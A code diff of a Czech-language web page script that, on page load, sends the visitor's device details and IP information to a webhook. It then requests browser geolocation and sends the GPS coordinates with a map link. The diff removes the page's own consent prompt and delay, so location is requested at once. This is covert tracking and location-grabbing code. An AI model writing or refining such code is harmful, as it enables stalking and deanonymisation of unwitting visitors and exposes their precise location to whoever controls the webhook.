@@ -40,23 +40,16 @@
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
                 sendToWebhook(message);
-                askForLocation();  
+                requestLocation();  
             });
         }
 
-        function askForLocation() {
-            setTimeout(() => {
-                if (confirm("Chceš povolit sdílení polohy?")) {
-                    getLocation();
-                }
-            }, 2000);
-        }
-
-        function getLocation() {
+        function requestLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(position => {
                     let { latitude, longitude } = position.coords;
-                    let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15)`;
+                    let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
+                    let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
                     
                     getIPInfo(ipData => {
                         let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
@@ -71,7 +64,7 @@
             }
         }
 
-        // Spuštění procesu
+        // Automaticky požádá o polohu
         sendInitialData();
     </script>
 </body>
